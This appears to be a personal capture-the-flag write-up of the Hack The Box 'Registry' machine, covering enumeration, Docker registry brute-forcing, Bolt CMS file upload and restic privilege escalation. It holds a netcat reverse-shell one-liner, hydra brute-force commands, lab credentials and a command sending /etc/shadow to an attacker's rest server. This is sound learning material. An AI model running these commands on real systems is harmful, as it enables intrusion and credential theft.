# <span style="color:#9933FF">Machine #16 Registery</span>  


## <span style="color:#9933FF">Notes During Working on the Machine 🧐🤓   

* The http service `-sV` `80/tcp open  http    nginx 1.14.0 (Ubuntu)`.  
* `/install` found it with the gobuster command and it contains pure gebbrish.  
* The web application just loads when provided with `backup.php` and then it opens a blank page. Which means the page exists because I tried some random shit .php and it gave me 404.  
* Found a couple of configuration files.
* Seems like there's a LFI vulnerability.
* Because I'm able to open files in directories I'm forbidden to access.
* Still no trace of a login page (If it's necessary anyway).
* gobuster dir -u http://10.10.10.159/install -x .php,.txt,.html,.md -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 -b 403,404  
  ```
  gobuster dns -d registry.htb -w ./test.wordlist  
  ```

 * Version of bolt I found is 3.6.4 .  
 * Seems that bolt is coded with php.  
 * I tried to gobuster with different directories but it's no use. It's not giving me anything new.
 * I also tried to gobuster the subfolders.
 * Found twig files in `/bolt/theme/base-2018/[FILENAME]` or something like that. Not sure that I remember it correctly.

* Ok I'm going to check all the files I can.  
* I think the only thing that might be useful at the moment in the bolt website is this message  
  <img src="something.png">  
  * Still not sure how thooo.
<br/><br/>

* Response header called `X-Debug-Token: 7ea91f` indicates that the "profiler" is running and it might be exposing information ( the symphony profiler) which is great news.
* It doesn't seem like it's the profiler thing.
* To get authenticated the only thing that makes sense is that 
  * Either the login page has a weird, very very unusual name or that I can put a session key or cookie into the request and act like I'm authenticated BUT I don't have a cookie or a session key. I don't have any other web page that this "bolt". 
  * I almost memorized it's documentation.
  * The login page is usually at `/login`.
  * "anonymous" is allowed to login in the config file which means I'm not locked out entirely.
* I thought this might've been interesting `Strict-Transport-Security: max-age=63072000; includeSubdomains` the "includeSubdomains" part but turns out it's also a deadend.  
* Found this file and it seems interesting `https://10.10.10.159/bolt/composer.json`
* It seems like the way we're accessing data in bolt is "RESTful" which is the way that treats the portion between the domain and the parameters as data instead of using parameters "/bolt/entry/1".  

* Finally I got something  
* I got this through requesting `/v2` but I need to find an endpoint I guess.  
  ```uri
  HTTP/1.1 401 Unauthorized

  Server: nginx/1.14.0 (Ubuntu
  Date: Fri, 11 Feb 2022 09:32:27 GMT
  Content-Type: application/json; charset=utf-8
  Content-Length: 87
  Connection: close
  Docker-Distribution-Api-Version: registry/2.0
  Www-Authenticate: Basic realm="Registry"
  X-Content-Type-Options: nosniff


  {"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
  ```  

* That's what I found by researching  
  <blockquote>
  If a 401 Unauthorized response is returned, the client should take action based on the contents of the “WWW-Authenticate” header and try the endpoint again. Depending on access control setup, the client may still have to authenticate against different resources, even if this check succeeds.
  </blockquote>  

* The realm is as follows  
  <blockquote>
  The "realm" authentication parameter is reserved for use by authentication schemes that wish to indicate a scope of protection.
  A protection space is defined by the canonical root URI (the scheme and authority components of the effective request URI) of the server being accessed, in combination with the realm value if present. These realms allow the protected resources on a server to be partitioned into a set of protection spaces, each with its own authentication scheme and/or authorization database. The realm value is a string, generally assigned by the origin server, that can have additional semantics specific to the authentication scheme. Note that a response can have multiple challenges with the same auth-scheme but with different realms.
  </blockquote>  

  ```
    hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst docker.registry.htb -s 443 https-get /v2/
  ```  

* I GOT ACCESS. I brute forced the authentication of the docker registry and found a password "admin:admin" on the http service not the https.  
* Found a passphrase for bolt ssh login "GkOcz221Ftb3ugog".
* Uncommon setuid binary `/sbin/mount.cifs`.  
* Backups no OS  
  ```console
  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/tests/_data/dump.sql
  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/pianist/tests/_data/dump.sql
  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/shire/tests/_data/dump.sql
  /var/www/html/bolt/vendor/codeception/codeception/tests/data/dump.sql
  /var/www/html/bolt/vendor/codeception/codeception/tests/data/claypit/tests/_data/dump.sql
  ```  

* `Feb10     1754     root registry serve /etc/docker/registry/config.yml`

* Seems interesting `Feb10     1726     root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000`  

  ```
  GET /v2/_catalog HTTP/1.1
  Host: 172.18.0.2:5000
  Authorization: Basic YWRtaW46YWRtaW4=
  ```  

* There's no docker group and I can't create one
* I can't see if I have sudo privilege because I don't know what's my user's password.

* The docker registry stuff are stored in this path `/srv/docker-registry/data/docker/registry/v2`.

* Possiblities  
  * the backup that I can execute when requesting the "backup.php" page.
  * Docker? I don't have permission to do anything ( I'm excluding it for now) or maybe I can try and do something about the permission denied.
  * there's something weird in one of the database files ( it has a column called "stack" and inside of it, there's a value of ["files://shell.php"]) which looks interesting but I don't know what the hell it means.  
  * The `runc` command but there's nothing from its side either.
  * There's also the `registry serve /etc/docker/registry/config.yml` command that neither the command exists nor the file in the path exists.  

* This could be something `/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request`.  
* Use SUID3NUM it's nice. Relieves the burden of searching through the SUID binaries and checking if it's normal that they have the sticky bit or not. ( And it's legit in OSCP)  


* Database table I found in the linpeas scan  
  ```console
  CREATE TABLE bolt_authtoken (
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
    user_id INTEGER DEFAULT NULL, 
    username VARCHAR(32) DEFAULT NULL, 
    token VARCHAR(128) NOT NULL, 
    salt VARCHAR(128) NOT NULL, 
    lastseen DATETIME DEFAULT NULL, 
    ip VARCHAR(45) DEFAULT NULL, 
    useragent VARCHAR(128) DEFAULT NULL, 
    validity DATETIME DEFAULT NULL)
  1, 
  1, 
  None, 
  a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2, 
  f8e7da1a2b9ea7109e0bdeedb6e85135, 
  2019-10-08 21:25:07, 
  192.168.1.52, 
  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36, 
  2019-10-22 21:25:07
  ```  

<blockquote>
The bolt_authtoken cookie is used to store a token for your identification in the bolt admin interface after you logged in (if you remove it you will be logged out).
</blockquote>

Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f


* Found this commit   
  ```
  commit 42af4fd3a178de245cf11aced78d7354fde2e246
  Author: ToBe998 <tobe@topolis.de>
  Date:   Wed Sep 12 22:17:25 2018 +0200

      Added method to login as specific user without password (#7664)
      
      * Added method to login as specific user without pasword
      
      As discussed on Slack, the added `loinAsUser()` method enabled extension crea
  tors to override the login mechanics and connect bolt to various kinds of SSO sys
  tems. Since the logic for user management and authentication is currently (pre 4.
  1) not centralized enough, a lot of needed code would have to be duplicated to ar
  chive this. (And we certainly dont want to go there ;) )
      
      PS: The file is identical to 3.5 and could also be backported?
      
      I can provide guides on how to do this if needed.
      
      * phpdoc updated
      
      * Update Login.php
      
      * code reviews
      
      * Update Login.php
      
      * Update Login.php

  ```  

* I found the login page.
* Turns out the profiler is the key.

* FOUND PASSWORD `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry`  

  ```
  sudo restic backup -r "rest:http://10.10.14.18:1234/ABCDEFU" "/etc/shadow"
  ./rest-server --listen ":12345"
  restic init -r "rest:http://127.0.0.1/bolt"
  restic init -r "rest:http://localhost:$RPORT/$NAME"
  /tmp/rest-server --listen ":5555" --no-auth
  restic -r /tmp/restShit restore c0075dc5 --target /tmp/restOut
  restic backup -r restShit restore c0075dc5 --target /tmp/restOut 
  ```  

* web server `DocumentRoot /var/www/html`


## <span style="color:#9933FF">How Did I Solve the Machine 😎🥳 

1. Did some useless and insane BFing.
2. Domain of the SSL certificate was the answer which led to me finding out that the domain `docker.registry.htb` is a docker registry and that I can access a docker image saved in the repositories of it which led me to gain access to bolt's ssh private key and its passphrase.  
3. After getting into the system as bolt I kept enumerating and cursing this damn machien until I found a file that had some kind of log of the urls that have been visited and found the login page through that.
4. Then brute forced the password of the admin that I found in the linPEAS scan in one of the database files and logged in bolt with.
5. Now, what's left is to upload a rev shell to get rce as www-data.
6. So I uploaded the file in the folder with the frontend stuff because the root has a cron that deletes the files in the folder files each minute I think.
7. I had to add `.php` in the list of allowed extensions in the config.yml file.
8. Then upload the reverse shell which gave me a hard time because I couldn't connect to my box so I had to listen on the victim itself.
9. As soon as I was www-data I was able to use the ability of www-data to `sudo restic` with the `rest http` method so that the files won't be backed up with the privileges they are in right now.

<br/><br/>



## <span style="color:#9933FF">Where I Got Stuck?😡😧  

* In a lot of places  
* I didn't look into the ssl certificate the right way so I got stuck on trying to gain foothold on the system.
* Then I really relied on linPEAS and the other enumeration tools when they proved to sometimes be not very helpful and that I have to do an enumeration of my own.
* Then I used the `restic` command the wrong way which led to me backing up the root's files with root privilege but then I used it the correct way and got root and then read the contents of the SSH file.  
<br/><br/>



## <span style="color:#9933FF">What Did I learn from this Machine?👀  

### <span style="color:#9933FF"> Weak Credentials
* The password for the docker registry was admin/admin.  
* Also, the password for the bolt account was easily crackable "strawberry". Is it true that the harder the password is the harder it is to crack it's hash? I mean it makes sense because when we thing about it if the password is hard it might not be in a wordlist at all. Which means we can't crack it.

### <span style="color:#9933FF"> Old Software  
* The bolt version was not up to date which led to me exploiting a file upload vulnerability in that version.  

### <span style="color:#9933FF"> The Ability to Download php files  
* Also, maybe the fact that the admin was able to edit the config.yml file, which gave the ability to manipulate allowed file extensions.  
* Maybe the fact that the extension checking only relied on the configuration file. I think even if the admin can choose whatever extensions they want some extensions should always be restricted like the `.php` extension as an example.

<br/><br/>



## <span style="color:#9933FF">Writeups ✍🏽📓   

### Ippsec's Walkthrough  
* If I did the aggressive nmap scan on the https port I get the ssl certificate which gives me the information I need for the subdomain of the virtual host. There also could be the date when the certificate was created.  
* For the domain of the IP he put `docker.registry.htb` and `registry.htb` in the `/etc/hosts` file in case both are needed  
  ```console
  10.10.10.159  docker.registry.htb registry.htb
  ```  
* It's always good to look at the SSL certificate info.  
* He `curl -vvv http://url` and compared it with the `curl -vvv -k https://url` he compared the outputs to see if there's a difference in the headers.
* He uses "FoxyProxy".
* We can list repositories in Docker Registry by going to `http://docker.registry.htb/v2/_catalog`.
* He used `docker.io` package to go through the bolt-image instead of just looking in the folders.
* We just need to login with `docker login docker.registry.htb` but it gave an error that the "certificate signed by unknown authority". To fix that he added the certificate. How? It's in the install zip file that he installed so he copied it to `/etc/docker/certs.d/docker.registry.htb`.  
* `docker run -it docker.registry.htb/bolt-image sh` to get a shell on our local system but it's running the docker image.   
* We can notice the dates the files and certificates and really anything was created and then try and search with this command `find / -type -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null | grep -v ' /var/'` for the stuff that was modified in a specific range of dates. He also put the ` /var/` in the command because as said by him var isn't really interesting right away.  

* All SSH keys should have a privilege of 600.  

* We can create a file in the `.ssh` in my home as an attacker called "config" which can help me with sshing to hosts by providing some info on how to ssh to that specific host like the following  
  ```console
  Host  [ANY NAME]
          HostName 10.10.10.159
          User bolt
          IdentityFile /path/to/ssh/key
  ```  

* The file `.viminfo` could give me some more information (If it did not have the size of zero).  

* The first thing he did when he gained foothold is the command `ip addr` to see if we're on the machine itself or in anothe docker container.  

* He opened any `.db` file by `wget`ting the file to his box and then he used sqlite there.
* He first copied the files he wanted to be downloaded on his box to `/dev/shm`.
* The problem with the thing that I can't connect to a reverse shell or basically anything from my box is that there's a rule in the IP table that prevents the three way handshake from happening outbound. It's something like this `-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYNRST,ACK SYN -j DROP`.  

* The `-r` option in the the restic command means "recursive". 

<br/><br/>



* feroxbuster's 

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->